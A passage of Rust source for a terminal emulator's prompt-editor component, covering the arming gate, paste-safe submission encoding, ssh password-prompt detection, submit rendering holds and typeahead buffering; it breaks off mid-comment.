//! P3 Composer v1: a native prompt editor drawn at the bottom of the
//! terminal card, active only when the shell is demonstrably at an
//! interactive prompt (spec: docs\p3-composer-v1-spec.md).
//!
//! While composing, ZERO bytes reach the PTY per keystroke. The only bytes
//! this module ever writes are user-intended input: the submission (paste
//! semantics + `\r`), the bare `\r` prompt refresh, and — on explicit click
//! into a dirty prompt only — one Ctrl+C clear chord. Prompt detection is
//! pure observation of the hook events P2's scanner already produces
//! (mirror/parser purity, inv. 1).
//!
//! The strip is a CONSTANT 36px reservation for hooked terminals only: grid
//! geometry never depends on transient shell state (inv. 5, resize-storm
//! incident class), and hookless sessions (`epoch == 0`) never allocate a
//! `ComposerState` at all (inv. 2).

use std::collections::VecDeque;
use std::time::{Duration, Instant};

use alacritty_terminal::term::TermMode;
use egui::{
    Align2, Color32, CornerRadius, FontId, Id, Key, Modifiers, Pos2, Rect, Sense, Stroke,
    StrokeKind, Ui, Vec2,
};
use uuid::Uuid;

use super::complete;
use super::term_backend::{Reclaim, TermBackend};
use crate::state::BlockRec;

/// Constant bottom-strip reservation per hooked terminal (D1).
pub const STRIP_H: f32 = 36.0;
/// Beyond this many draft lines the upward editor scrolls internally.
const EDITOR_MAX_ROWS: usize = 8;
/// Settle debounce after a `pre` latch before auto-arming. ZERO: the headline
/// UX is that a user typing the instant a prompt returns lands in the
/// composer — ANY delay loses that race to the grid (the first key falls
/// through raw → `episode_used` → ManualOnly for the whole episode: the
/// confirmed root cause of "typing goes raw at a fresh prompt"). Rapid
/// re-prompts (cls/command bursts) are handled by re-latching per `pre` (arm
/// stays stable, idempotent) and the stray-text guard is `cursor_clean`
/// (grid observation), not a timer — so a fast typist never loses the race
/// yet type-ahead still can't arm over echoed text.
const SETTLE: Duration = Duration::ZERO;
/// Presentational SubmitHold cap (render-bugs pass, Bug 1b — was 250ms):
/// never paint the just-submitted ghost over a stale grid row longer than
/// this, even if the echo never becomes observable in the grid. The old
/// 250ms cap force-released the hold when a machine hitch delayed the shell
/// echo — and since release is the ONLY history-cover conversion point, the
/// late echo then rendered as a raw `PS …> cmd` row FOREVER (the "history
/// rows inconsistently styled" class). Release between submit and this bound
/// belongs to grid observation alone (`echo_landed`); the bound only exists
/// for a shell that truly ate the input (honest bare row restored).
const SUBMIT_HOLD_MAX: Duration = Duration::from_millis(1500);
/// Freshness cap on the prompt-render-window blank (Bug 2): the incoming
/// prompt row is only blanked this long after the `pre` latch — if the
/// 133;B never arrives (lost hook), the raw prompt resurfaces long before
/// the DEMOTE clock would step Compose down.
const INCOMING_COVER_CAP: Duration = Duration::from_millis(500);
/// Strip hysteresis (stable-chrome): the left lane stays FROZEN QUIET for
/// this long after a submit/exec/prompt edge before revealing Busy content
/// or the raw label — instant commands (`ls` round-trips in 30-120ms) never
/// flash the strip through busy/label states. Just under reaction time.
const REVEAL: Duration = Duration::from_millis(180);

/// How long an active Compose may sit with its cover certainty broken
/// (prompt latch gone or the grid cursor off the captured prompt end, no
/// SubmitHold bridging) before it demotes to Raw (restored-render fix).
/// Long enough to ride out every legitimate transient — the manual-activate
/// clear-chord round-trip (~150-250ms to a fresh prompt), the pre→133;B
/// render gap, a conhost resize repaint — short enough that the broken
/// steady state (armed hint lane + a raw prompt row with its own cursor,
/// indefinitely, on an idle restored session) can't establish itself.
const DEMOTE: Duration = Duration::from_millis(750);

/// Held-Enter spacing (restored-render fix, scope #3): empty-Enter gestures
/// queue instead of dispatching per keypress, and at most this many spacers
/// may sit in a row at the queue's tail — a shell can only render prompts so
/// fast, so excess key-repeats coalesce instead of flooding `\r` (the field
/// failure: holding Enter blew through the composer into raw prompt spam and
/// a blanked-void grid).
const SPACER_QUEUE_CAP: usize = 3;

/// Post-submit typeahead window (the fast-typing fix): after a composer
/// submission, if the fresh `pre` has NOT come back within this long, the
/// submitted command is long-running — everything typed since the submit
/// (queued commands + the live draft) FLUSHES to the PTY in order as shell
/// type-ahead (PSReadLine/readline buffer it natively) and the composer
/// yields Raw(Busy). Under it, typed keys stay buffered in the editor: the
/// common fast-typing case re-latches in 50–150ms and the draft is already
/// in place. Tunable. (A SubmitHold ghost MAY outlive this window since Bug
/// 1b: an echo delayed past the flush keeps the hold pinned — mode flips to
/// Raw(Busy) while the lane stays Frozen on the held text, which is the
/// honest reading of "submitted, not yet echoed".)
const POST_SUBMIT_FLUSH: Duration = Duration::from_millis(300);

/// A post-submit window whose resolution tick arrives this much later than
/// dispatch (the terminal was deselected / the GUI occluded — tick paused)
/// must never fire the buffered bytes: the moment has passed. The buffer is
/// folded into the visible draft instead, and the user re-confirms.
const WINDOW_STALE: Duration = Duration::from_millis(2000);

/// Hard cap on blind-queued submissions. Beyond it, Enter falls back to the
/// visible-buffering newline (fusion guard) instead of growing the queue.
const PENDING_CAP: usize = 16;

/// Per-terminal composer mode. Raw is the default and the fallback.
#[derive(Clone, Copy, PartialEq, Debug)]
pub enum ComposerMode {
    /// Editor shown; when it has egui focus, keys land in the draft only.
    Compose,
    /// All keys go to the PTY exactly as today. The reason drives the strip's
    /// label.
    Raw(RawReason),
}

#[derive(Clone, Copy, PartialEq, Debug)]
pub enum RawReason {
    /// Open block (command / TUI running) — strip shows cmd + elapsed.
    Busy,
    /// Full-screen app owns the screen.
    AltScreen,
    /// Hooked but no `at_prompt` latch yet (fresh spawn, cold attach).
    NoPrompt,
    /// User typed raw / clicked the grid at an armed prompt (episode used).
    UserRaw,
    /// Session exited.
    Dead,
    /// SLEEP §7.3: the user shelved this terminal — lane shows `☾ asleep`
    /// with the accent `Wake ▸` in the Run slot. Draft kept for the return.
    Asleep,
}

/// Everything the gate looks at, all existing or feed-time observable (§2.1).
pub struct GateInputs {
    pub hooked: bool,
    pub running: bool,
    pub alt: bool,
    pub mouse: bool,
    pub open_block: bool,
    pub at_prompt: bool,
    pub settled: bool,
    pub cursor_clean: bool,
    pub episode_used: bool,
    /// SLEEP: the persisted asleep flag (covers the Sleeping drain
    /// transient too, where `running` is still true for a moment).
    pub asleep: bool,
}

#[derive(PartialEq, Debug)]
pub enum GateVerdict {
    /// All conditions — take focus, show the editor.
    AutoArm,
    /// Core passes but the cursor is dirty / the episode is used — show the
    /// Compose button only.
    ManualOnly,
    Blocked(RawReason),
}

/// The pure gate function (§2.5) — unit-tested row by row.
pub fn gate(i: &GateInputs) -> GateVerdict {
    if !i.hooked {
        return GateVerdict::Blocked(RawReason::NoPrompt); // strip absent anyway
    }
    // SLEEP: the flag wins over `running` — it covers the Sleeping drain
    // transient (never arm into a world being torn down) AND keeps the
    // per-frame tick from clobbering Raw(Asleep) back to Raw(Dead) once the
    // exit lands (the tick re-derives the mode from this gate every frame).
    if i.asleep {
        return GateVerdict::Blocked(RawReason::Asleep);
    }
    if !i.running {
        return GateVerdict::Blocked(RawReason::Dead);
    }
    if i.alt {
        return GateVerdict::Blocked(RawReason::AltScreen);
    }
    if i.open_block {
        return GateVerdict::Blocked(RawReason::Busy);
    }
    if i.mouse {
        return GateVerdict::Blocked(RawReason::Busy);
    }
    if !i.at_prompt || !i.settled {
        return GateVerdict::Blocked(RawReason::NoPrompt);
    }
    if i.cursor_clean && !i.episode_used {
        GateVerdict::AutoArm
    } else {
        GateVerdict::ManualOnly
    }
}

/// PRE-SHELL raw-conversation state (v0.1.1, the ssh password-phase fix): a
/// hooked terminal whose CURRENT lifetime has produced no hook event yet
/// (`pre_seen`/`exec_seen` still at their post-Reset origin) and whose
/// prompt latch is not live is talking to something that is NOT the shell —
/// ssh auth (password / host-key), a slow login chain, a dead bootstrap.
/// While pre-shell the composer must never offer `❯ Compose` (no arm
/// affordance, no AutoArm, no cold-attach heuristic): the field failure was
/// the strip inviting a mouse-first user to type their ssh password into a
/// visible plaintext editor. Exit is the first token-checked hook of the
/// lifetime — the same signal ssh auto-reconnect uses as its success
/// witness. No timers, no prompt heuristics (per the A-investigation
/// design): every input is an existing per-lifetime signal.
pub(crate) fn pre_shell(
    running: bool,
    alt: bool,
    pre_seen: u64,
    exec_seen: u64,
    at_prompt_latched: bool,
) -> bool {
    running && !alt && pre_seen == 0 && exec_seen == 0 && !at_prompt_latched
}

/// What the pre-shell conversation is asking RIGHT NOW, read from the grid
/// cursor row's text (render-only — a miss degrades to the generic label,
/// never a wrong cover). Anchored at the END of the row text (trim-end'd),
/// mirroring `(?i)(password|passphrase|passcode)[^:]*:\s*$` and
/// `\(yes/no(/\[fingerprint\])?\)\?\s*$` without a regex dependency.
#[derive(Clone, Copy, PartialEq, Debug)]
pub(crate) enum AuthPrompt {
    /// `…password:` / `Enter passphrase for key '…':` — echo is off; keys go
    /// straight to ssh.
    Password,
    /// `…(yes/no/[fingerprint])?` — the host-key confirmation.
    HostKey,
    None,
}

pub(crate) fn detect_auth_prompt(row: &str) -> AuthPrompt {
    let t = row.trim_end();
    if t.ends_with("(yes/no)?") || t.ends_with("(yes/no/[fingerprint])?") {
        return AuthPrompt::HostKey;
    }
    if let Some(body) = t.strip_suffix(':') {
        let lower = body.to_lowercase();
        for kw in ["password", "passphrase", "passcode"] {
            if let Some(i) = lower.rfind(kw) {
                // The keyword's run must reach the colon with no earlier
                // colon in between (the `[^:]*:` tail of the pattern).
                if !lower[i + kw.len()..].contains(':') {
                    return AuthPrompt::Password;
                }
            }
        }
    }
    AuthPrompt::None
}

/// Submission encoding (§4.1): byte-identical to paste-then-Enter. Bracketed
/// iff the shell requested DECSET 2004 (PSReadLine 2.0 on PS 5.1 never does —
/// unconditional brackets would leak literal `ESC[200~` into its buffer);
/// the accept `\r` goes OUTSIDE the brackets. An empty draft submits a bare
/// `\r` (prompt refresh, block-silent — §13.6).
pub fn submission_bytes(backend: &TermBackend, draft: &str) -> Vec<u8> {
    let text = draft.trim_end(); // a trailing \n would double-submit on 5.1
    // r2-F2: drafts can carry pasted content — strip controls so a literal
    // `ESC[201~` can never close the bracket early and execute the rest.
    let text = crate::strip::sanitize_paste(text);
    let sanitized = text.replace("\r\n", "\r").replace('\n', "\r");
    let mut out = Vec::with_capacity(sanitized.len() + 16);
    if !sanitized.is_empty() && backend.mode().contains(TermMode::BRACKETED_PASTE) {
        out.extend_from_slice(b"\x1b[200~");
        out.extend_from_slice(sanitized.as_bytes());
        out.extend_from_slice(b"\x1b[201~");
    } else {
        out.extend_from_slice(sanitized.as_bytes());
    }
    out.push(b'\r'); // accept-line, OUTSIDE the brackets
    out
}

/// What a plain Enter in the editor does (the FUSION GUARD + the typeahead
/// routing rule, pure so both are pinned by test): submit when armable;
/// QUEUE a pending submission while the post-submit typeahead buffer is
/// engaged (blind `cmd1⏎cmd2⏎cmd3⏎` executes as sequential clean blocks,
/// one command per prompt cycle); insert a line break when un-armable with a
/// draft outside the buffer (the TextEdit takes the key natively — the draft
/// visibly holds both commands as separate lines and submission encodes each
/// as its own `\r`, so two commands can never silently fuse); swallow when
/// un-armable and empty (a newline would just grow the editor).
#[derive(PartialEq, Debug, Clone, Copy)]
pub(crate) enum EnterAction {
    Submit,
    /// Post-submit buffering: the draft becomes a queued submission (or a
    /// queued spacer when empty), dispatched one-per-prompt-cycle by
    /// `pump_pending`.
    Queue,
    InsertNewline,
    Swallow,
}

pub(crate) fn enter_action(can_submit: bool, has_draft: bool, buffering: bool) -> EnterAction {
    if can_submit {
        EnterAction::Submit
    } else if buffering {
        EnterAction::Queue
    } else if has_draft {
        EnterAction::InsertNewline
    } else {
        EnterAction::Swallow
    }
}

/// Buffered text as the raw KEYSTROKES the user effectively typed: UTF-8
/// passthrough with every newline as `\r` (Enter). Used by the typeahead
/// flush — never bracketed (these emulate typing, not a paste).
fn keystroke_bytes(s: &str) -> String {
    s.replace("\r\n", "\r").replace('\n', "\r")
}

/// Clipboard → draft normalization (Bug E): CRLF/CR become LF, control
/// characters strip (same policy as submission's sanitize_paste), and
/// TRAILING newlines trim — a copied line's trailing \n must not flip the
/// lane editor into the upward multi-line popup. Interior newlines are
/// preserved (real multi-line pastes still grow the editor upward).
pub(crate) fn normalize_paste_text(s: &str) -> String {
    let s = crate::strip::sanitize_paste(s); // keeps \r \n \t, strips ESC/C0/C1
    s.replace("\r\n", "\n")
        .replace('\r', "\n")
        .trim_end_matches('\n')
        .to_string()
}

/// How many rows the draft editor needs (Bug E belt): rows come from the
/// TRIMMED content so a trailing-newline-only draft can never open the
/// upward popup even if a future entry point forgets to normalize. The
/// draft content itself is untouched.
pub(crate) fn editor_rows(draft: &str) -> usize {
    draft.trim_end_matches('\n').split('\n').count().max(1)
}

/// The click-gated clear chord (§4.2): Ctrl+C = PSReadLine `CancelLine`, the
/// only edit-mode-independent line-kill (Escape is a meta prefix in Emacs
/// mode and enters command mode in Vi mode — catastrophic before a paste).
/// Sent ONLY on explicit user activation over a provably-dirty prompt.
/// Also the busy INTERRUPT chord for every family (^C cancels a running
/// command on cmd too — the per-family split is line-CLEAR only, D15).
fn clear_chord(backend: &TermBackend) -> Vec<u8> {
    if backend.win32_input {
        if let Some(seq) = crate::win32_input::encode_key(Key::C, Modifiers::CTRL) {
            return seq;
        }
    }
    vec![0x03]
}

/// Per-family line-clear for `activate()` over a dirty prompt (P6b §6/D15):
/// **ESC for cmd** — cmd's line editor clears the input in place, no `^C`
/// splatter, no new prompt needed (cmd's prompt latch was never cleared by
/// an exec hook, so there is nothing to re-latch); Ctrl+C everywhere else
/// (readline-safe, edit-mode-independent).
fn line_clear_chord(backend: &TermBackend, is_cmd: bool) -> Vec<u8> {
    if !is_cmd {
        return clear_chord(backend);
    }
    if backend.win32_input {
        if let Some(seq) = crate::win32_input::encode_key(Key::Escape, Modifiers::NONE) {
            return seq;
        }
    }
    vec![0x1b]
}

/// Whether an outgoing raw-input blob carries an Enter press — the trigger
/// for the P6b observed-raw capture (a cmd command typed in Raw mode gets a
/// record-only `SubmitCommand{write:false}`). VT mode: a literal `\r`.
/// win32-input-mode: a KEY_EVENT record `ESC[Vk;Sc;Uc;Kd;…_` with Vk=13
/// (VK_RETURN) and Kd=1 (key down).
pub(crate) fn bytes_contain_enter(bytes: &[u8], win32: bool) -> bool {
    // A literal `\r` is Enter in BOTH modes: VT-encoded Enter is `\r`, and
    // under mode 9001 plain text (a grid paste) still passes through as
    // UTF-8 where conhost synthesizes the key events — a pasted newline
    // submits either way.
    if bytes.contains(&b'\r') {
        return true;
    }
    if !win32 {
        return false;
    }
    let mut i = 0;
    while let Some(off) = bytes[i..].iter().position(|&b| b == 0x1b) {
        let start = i + off;
        let rest = &bytes[start..];
        if rest.len() > 2 && rest[1] == b'[' {
            if let Some(end) = rest.iter().position(|&b| b == b'_') {
                if let Ok(body) = std::str::from_utf8(&rest[2..end]) {
                    let mut f = body.split(';');
                    let vk = f.next().and_then(|v| v.parse::<u32>().ok());
                    let kd = f.nth(2).and_then(|v| v.parse::<u32>().ok());
                    if vk == Some(13) && kd == Some(1) {
                        return true;
                    }
                }
                i = start + end + 1;
                continue;
            }
        }
        i = start + 1;
    }
    false
}

/// The post-submit typeahead window: live from a composer submission until
/// the fresh `pre` re-latch, an interactivity flip (alt/mouse), or the
/// POST_SUBMIT_FLUSH threshold. While it is live the composer STAYS in
/// Compose with the editor focused: every key routes into the draft, NEVER
/// raw to the PTY — the submit→re-arm gap is exactly where fast typing used
/// to fall through and echo at the shell (raw `PS …>` prompts, visible `^C`
/// reclaim churn, stranded fragments).
#[derive(Clone, Copy)]
struct SubmitWindow {
    /// `pre_seen` at dispatch: resolution (c) requires a STRICTLY fresh pre.
    pre0: u64,
    since: Instant,
}

/// Presentational-only handoff after submit (Bug 3): the just-submitted
/// command is painted read-only on the covered prompt row (and frozen in the
/// lane while the draft is empty) until the grid underneath catches up, so
/// the Enter keypress causes ZERO visual change. Input routing stays in the
/// editor (post-submit typeahead buffering); this state paints nothing to
/// the PTY.
struct SubmitHold {
    /// The trimmed draft text as the user last saw it.
    ghost: String,
    /// Grid line the cover occupied AT SUBMIT — the pin. Rendered (and
    /// released, and converted) at `hold_row`: this line shifted by exactly
    /// the history growth since submit, the same drop-don't-drift rule
    /// anchors and covers follow. NEVER re-read from a live prompt_end.
    line: i32,
    /// Grid column where the echo text will start (the captured prompt-end
    /// col at submit) — where `echo_landed` reads the row's cells.
    col: usize,
    /// Dimmed cwd painted in the hold ghost — carried into the permanent
    /// history cover on release so the hold→history swap is pixel-zero.
    cwd: Option<String>,
    since: Instant,
    /// history_size at submit: the shift baseline for `hold_row`.
    history: usize,
    /// Grid (cols, rows) at submit: a resize reflows rows unpredictably, so
    /// any change drops the pin (honest raw row instead of a drifted cover).
    grid: (u16, u16),
}

/// The hold's pinned row in the CURRENT grid's coordinates: the submit-time
/// row shifted by the history growth since submit — exactly how anchors and
/// presentational covers ride the scroll. `None` = the pin is no longer
/// maintainable (history shrank via ED3/clear, the grid was resized, or the
/// row fell off the ring): release, never drift. The un-shifted `h.line` was
/// the third submit-flicker mechanism — after a scroll it pointed rows BELOW
/// the real echo (often the NEXT `PS …>` prompt row), so the release check
/// read the wrong row and the history-cover conversion landed the `❯ cmd`
/// styling on the wrong line (or silently failed, dropping the covered row
/// back to raw mid-transition).
fn hold_row(h: &SubmitHold, backend: &TermBackend) -> Option<i32> {
    if (backend.size.cols, backend.size.rows) != h.grid {
        return None;
    }
    let hist = backend.history_size();
    if hist < h.history {
        return None;
    }
    let line = h.line - (hist - h.history) as i32;
    (line >= -(hist as i32)).then_some(line)
}

/// Whether the hold may still be alive at `now` (Bug 1b): until the hard
/// bound, yes — the release decision belongs to `echo_landed` alone (text
/// verified, or the cursor left the pinned row: both states where the
/// conversion check reads a settled row). The old 250ms soft cap released a
/// hitch-delayed echo unconverted (release is the ONLY conversion point ⇒
/// permanent raw `PS …> cmd` row), and a cap-release mid-echo-render
/// (partial text on the row) would fail the verify the same way — hence no
/// timer between submit and the bound, and no cursor-motion test either.
/// If the shell truly ate the input (no echo ever), the bound restores the
/// honest bare row.
fn hold_active(h: &SubmitHold, _backend: &TermBackend, now: Instant) -> bool {
    now.duration_since(h.since) < SUBMIT_HOLD_MAX
}

/// GRID truth that the shell echo of the submitted command is visible under
/// the hold's cover — the only safe release signal. The exec-hook counter is
/// NOT one: ConPTY passes OSCs through immediately while conhost renders
/// text on an asynchronous frame (the P2 reorder), so the exec hook for the
/// submitted line routinely arrives in the stream BEFORE the echoed text —
/// releasing on it drops the cover onto a still-bare prompt row (the
/// confirmed "flicker on submit" root cause). Landed = at the SHIFTED pin
/// row, either:
/// - the row's cells show the submitted text (first draft line, compared at
///   the captured prompt-end col), or
/// - the cursor left that row (the accept-newline renders strictly after
///   the echo in the byte stream, so the echo is in the grid).
fn echo_landed(backend: &TermBackend, h: &SubmitHold, row: i32) -> bool {
    if backend.cursor_line() != row {
        return true;
    }
    backend.row_has_text_at(row, h.col, h.ghost.lines().next().unwrap_or(""))
}

/// Where an active recall walk started (P4 §7.2): a plain ArrowUp walk over
/// this terminal's recs, or a cross-session history INSERT whose displaced
/// draft is stashed — ArrowDown-past-newest restores the stash for both (one
/// recall mechanism, two entry gestures).
#[derive(Clone, Copy, PartialEq, Debug)]
pub enum RecallSrc {
    Recs(usize),
    History,
}

pub struct ComposerState {
    pub mode: ComposerMode,
    pub draft: String,
    /// This terminal's shell family is Cmd (P6b — set once by the app from
    /// the meta-derived ShellFamily). Routes submissions through the
    /// `SubmitCommand` ledger instead of PTY bytes (cmd has no exec hook, so
    /// the daemon can't otherwise record blocks), swaps the dirty-prompt
    /// line-clear chord to ESC (D15), and refuses multi-line submission
    /// (cmd runs one line at a time — §6).
    pub is_cmd: bool,
    /// Tab completion (#24): this terminal's completion family — path
    /// namespace + quoting rules. Stamped with `is_cmd` at composer creation
    /// (static per terminal: derives from the persisted program+args).
    pub fam: complete::Family,
    /// Live Tab-completion cycle (#24). Authoritative ONLY while the draft
    /// is byte-identical to what the cycle last produced — any other edit
    /// (typing, recall, submit, reclaim, insert) commits the shown candidate
    /// by invalidating the cycle lazily at the next Tab/Esc.
    tab: Option<complete::TabCycle>,
    /// SLEEP §7.3: the terminal's persisted asleep flag, stamped by the app
    /// from every Snapshot (and at composer creation). Drives the gate's
    /// Blocked(Asleep), on_exited's reason pick, and the `☾ asleep` +
    /// `Wake ▸` lane. Draft is KEPT through sleep (the on_exited contract).
    pub asleep: bool,
    /// This terminal's shell family is Ssh (v0.1.1 pre-shell state): gates
    /// the raw-conversation strip labels ("ssh is asking…", the password
    /// lock line) — the pre-shell ARM VETO applies to every family, but the
    /// conversational labels only make sense where a real auth phase exists.
    /// Stamped with `is_cmd` at composer creation (static per terminal).
    pub is_ssh: bool,
    /// SSH auto-reconnect supervision is active (persisted flag riding every
    /// Snapshot, stamped like `asleep`). Drives the `reconnecting…` lane +
    /// the Cancel affordance in the Run slot. Draft kept throughout.
    pub reconnecting: bool,
    /// Prompt latch + settle timestamp (None = not at a prompt).
    at_prompt_since: Option<Instant>,
    /// Bytes were sent to the PTY during this prompt episode (D7).
    episode_used: bool,
    /// Last-seen BlockFeed counters, for edge detection.
    last_pre: u64,
    last_exec: u64,
    /// `pre_seen` at the last activation clear chord (v0.1.1): at most ONE
    /// `^C` may ship per prompt epoch — a systematically-wrong prompt-end
    /// capture used to loop click → chord → fresh prompt → wrong capture →
    /// click… into visible `^C` spam. A repeat activation in the same epoch
    /// arms without the chord (and without re-reclaiming) and yields
    /// honestly through the DEMOTE path if the capture stays broken.
    chord_pre: Option<u64>,
    /// History recall: (walk source, draft saved before recall began).
    recall: Option<(RecallSrc, String)>,
    /// One-frame flag: place the editor caret at the draft's end before the
    /// TextEdit shows (set by reclaim/insert — the user continues typing at
    /// the end of what just landed).
    caret_to_end: bool,
    /// One-frame flag: the editor should request egui focus this frame.
    pub want_focus: bool,
    /// Actual egui focus of the editor LAST frame (one-frame lag is fine:
    /// egui focus itself is authoritative; this only steers the grid's
    /// `request_focus` and the Enter/arrow consumption).
    pub has_focus: bool,
    /// Active submit handoff, if any (Bug 3).
    submit_hold: Option<SubmitHold>,
    /// Live post-submit typeahead window (None = not in the submit→re-arm
    /// gap). While Some, keys stay in the editor and Enter queues.
    post_submit: Option<SubmitWindow>,
    /// Blind-typed queue: submissions awaiting their prompt cycle. An empty
    /// string is a queued empty-Enter spacer (order against real commands is
    /// preserved — the flush rule requires byte order across queued Enters).
    pending: VecDeque<String>,
    /// Outbox: a grid-verified single-line command whose SubmitHold just
    /// released and should become a PERMANENT history cover in the backend
    /// (`❯ cmd` styling instead of ever showing the raw `PS …>` — the
    /// submit-flicker fix). Drained by the app into the backend (which owns
    /// the covers) right after `tick`. (line, col, cwd, cmd).
    pending_history_cover: Option<(i32, usize, Option<String>, String)>,
    /// Outbox: composer-authored bytes to send to the PTY right after `tick`
    /// (the sanctioned send path, drained by the app). Carries the typeahead
    /// buffer FLUSH (alt-screen/mouse flip, the busy threshold, demotion
    /// mid-buffer) — byte order is preserved against any Enter still queued.
    pending_clear: Option<Vec<u8>>,
    /// Outbox (P6b §5.2): a Cmd-family submission the app must ship as
    /// `C2D::SubmitCommand{write:true}` instead of Input bytes — the daemon
    /// computes the submission bytes from its mirror AND opens the synthetic
    /// block at the pre-write journal head. Set by `dispatch_submission`
    /// (hand-typed Enter, Run ▸, history Run, and the blind-queue pump all
    /// route here identically); drained the same frame. SubmitHold/cover
    /// mechanics are unchanged — the echo lands in the grid the same way.
    pending_submit_cmd: Option<String>,
    /// GUI-clock timestamp of the last exec edge (stable-chrome hysteresis):
    /// Busy content reveals only once the open block is ≥ REVEAL old, so
    /// instant commands never flash the busy row. GUI-side deliberately —
    /// rec.started_ms is daemon wall-clock plus Blocks latency.
    busy_since: Option<Instant>,
    /// Last submit / exec / pre / hold-release edge: while younger than
    /// REVEAL the Raw left lane renders FROZEN QUIET instead of switching
    /// content — the per-submit label/busy flicker killer (F3).
    last_activity: Option<Instant>,
    /// Compose certainty-loss clock (restored-render fix): the first frame
    /// an ACTIVE Compose could no longer justify the current-prompt cover
    /// (prompt latch or cursor-at-prompt-end broke and no SubmitHold is
    /// bridging). Sustained past `DEMOTE`, the composer steps down to Raw —
    /// the field failure was an armed hint lane UNDER a raw prompt row with
    /// its own cursor (two competing input surfaces) sitting like that
    /// forever on an idle restored session. None while healthy.
    compose_broken_since: Option<Instant>,
}

impl Default for ComposerState {
    fn default() -> Self {
        Self {
            mode: ComposerMode::Raw(RawReason::NoPrompt),
            draft: String::new(),
            is_cmd: false,
            fam: complete::Family::Pwsh,
            tab: None,
            asleep: false,
            is_ssh: false,
            reconnecting: false,
            at_prompt_since: None,
            episode_used: false,
            last_pre: 0,
            last_exec: 0,
            chord_pre: None,
            recall: None,
            caret_to_end: false,
            want_focus: false,
            has_focus: false,
            submit_hold: None,
            post_submit: None,
            pending: VecDeque::new(),
            pending_history_cover: None,
            pending_clear: None,
            pending_submit_cmd: None,
            busy_since: None,
            last_activity: None,
            compose_broken_since: None,
        }
    }
}

impl ComposerState {
    /// The prompt latch is live (a scanned `pre` with no `exec` after it).
    pub fn at_prompt_latched(&self) -> bool {
        self.at_prompt_since.is_some()
    }

    /// Counter-diff pump, called from drain_ipc for EVERY terminal on live
    /// Output (selected or not) — keeps unselected composers truthful.
    /// exec is applied before pre: that is their stream order whenever both
    /// land in one chunk (accept → command → next prompt).
    pub fn on_stream_events(&mut self, pre_seen: u64, exec_seen: u64, now: Instant) {
        // NOTE: a live SubmitHold is deliberately NOT released here. Hook
        // counters are stream truth, not grid truth: ConPTY delivers the exec
        // OSC ahead of the asynchronously-rendered echo text (P2 reorder), so
        // releasing on the counter drops the cover onto a still-bare prompt
        // row — the confirmed submit-flicker root cause. Release is grid-
        // observed in `tick` (echo_landed) with the 250ms cap as backstop.
        if exec_seen != self.last_exec {
            self.last_exec = exec_seen;
            // Instant disarm signal, feed-time — beats the Blocks round-trip.
            self.at_prompt_since = None;
            // Stable-chrome edges: the busy hysteresis clock starts here
            // (GUI-side, never rec.started_ms) and the quiet window opens.
            self.busy_since = Some(now);
            self.last_activity = Some(now);
            match self.mode {
                // Never yank focus from a typing user; a held draft stays
                // editable too (submit is gate-disabled until the next pre).
                // The post-submit typeahead buffer keeps Compose regardless
                // of focus: the exec edge for the JUST-submitted command is
                // the normal first event of every window — yielding here
                // would drop the buffered keys/queue to the grid raw (the
                // fast-typing fall-through this buffer exists to kill).
                ComposerMode::Compose
                    if self.has_focus || !self.draft.is_empty() || self.buffering() => {}
                _ => self.mode = ComposerMode::Raw(RawReason::Busy),
            }
        }
        if pre_seen != self.last_pre {
            self.last_pre = pre_seen;
            self.at_prompt_since = Some(now);
            self.episode_used = false;
            // The prompt edge closes the busy clock and opens a quiet window
            // so the pre→133;B transient never switches strip content.
            self.busy_since = None;
            self.last_activity = Some(now);
            // Any Raw reason becomes armable; tick's gate decides auto-arm.
            if matches!(self.mode, ComposerMode::Raw(_)) {
                self.mode = ComposerMode::Raw(RawReason::NoPrompt);
            }
        }
    }

    /// Cold-attach (task #15): the daemon certified this session is at an
    /// interactive prompt. Latch it exactly as a live `pre` would so the gate
    /// can auto-arm the instant the app opens — the cover only actually
    /// appears when the seeded `prompt_end` matches the replayed cursor
    /// (clean), so a dirty prompt still lands ManualOnly like live. Never
    /// disturbs an already-active Compose (a reconnect mid-composition).
    pub fn on_attach_prompt(&mut self, now: Instant) {
        if self.mode == ComposerMode::Compose {
            return;
        }
        self.at_prompt_since = Some(now);
        self.episode_used = false;
        self.mode = ComposerMode::Raw(RawReason::NoPrompt);
    }

    /// Restore/reconnect (D2C::Reset): draft kept (D8); latches re-arm from
    /// live hooks only. Queued blind submissions fold into the draft (the
    /// world was rewritten — never fire buffered bytes at it; the user sees
    /// and re-confirms them).
    ///
    /// v0.1.1 (the ssh password-phase plaintext exposure): the hook-counter
    /// baselines MUST resync to the fresh backend's origin. Reset replaces
    /// the TermBackend with a brand-new one whose `pre_seen`/`exec_seen`
    /// start at 0 (gui\mod.rs D2C::Reset) — comparing the old lifetime's
    /// counts against 0 made the very FIRST live output frame of the respawn
    /// (the `Password:` bytes, zero hook OSCs) read as a fresh prompt edge:
    /// `at_prompt` falsely latched off the password prompt itself, the strip
    /// offered `❯ Compose`, and a click gave a visible plaintext editor for
    /// the password.
    pub fn on_reset(&mut self) {
        self.fold_pending_into_draft();
        self.mode = ComposerMode::Raw(RawReason::NoPrompt);
        self.at_prompt_since = None;
        self.episode_used = false;
        self.last_pre = 0;
        self.last_exec = 0;
        self.chord_pre = None;
        self.want_focus = false;
        self.has_focus = false;
        self.submit_hold = None; // the world was rewritten — drop any ghost
        self.pending_history_cover = None;
    }

    /// Session exited. Draft kept; queued submissions fold into it (a dead
    /// PTY can't take them, and silently dropping typed commands lies).
    /// SLEEP §7.3: a flagged-asleep exit is the sleep kill landing — the
    /// reason presents as Asleep, not Dead (the user returns to their
    /// half-typed command after wake; draft-kept is the existing contract).
    pub fn on_exited(&mut self) {
        self.fold_pending_into_draft();
        self.mode = ComposerMode::Raw(if self.asleep {
            RawReason::Asleep
        } else {
            RawReason::Dead
        });
        self.at_prompt_since = None;
        // Counter-baseline resync, symmetric with on_reset (v0.1.1): the
        // next lifetime's backend starts its counters at 0 — stale baselines
        // from this lifetime must never fake a prompt edge on its first
        // output frame.
        self.last_pre = 0;
        self.last_exec = 0;
        self.chord_pre = None;
        self.want_focus = false;
        self.has_focus = false;
        self.submit_hold = None;
    }

    /// The post-submit typeahead buffer is engaged: a submit window is open
    /// or blind submissions are queued. While true, Enter queues and keys
    /// keep landing in the editor — never raw.
    pub(crate) fn buffering(&self) -> bool {
        self.post_submit.is_some() || !self.pending.is_empty()
    }

    /// The queue can take another blind submission.
    fn pending_has_room(&self) -> bool {
        self.pending.len() < PENDING_CAP
    }

    /// Queue one empty-Enter spacing gesture (scope #3). Key-repeats
    /// coalesce here: at most SPACER_QUEUE_CAP consecutive spacers sit at
